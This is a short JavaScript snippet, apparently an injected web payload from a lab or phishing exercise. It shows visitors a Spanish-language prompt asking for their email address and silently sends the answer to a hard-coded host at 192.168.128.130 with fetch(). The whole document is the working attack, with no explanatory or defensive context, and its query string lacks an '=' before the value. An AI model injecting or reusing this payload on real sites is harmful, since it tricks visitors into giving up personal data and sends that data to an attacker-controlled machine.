<script>
	var email = prompt("introduce tu correo:", "example@example.com");
	
	if (!email || email == "") {
		alert("introduce un correo valido");
	} else {	
		fetch("http://192.168.128.130/?email" + email);
		
	}
</script>
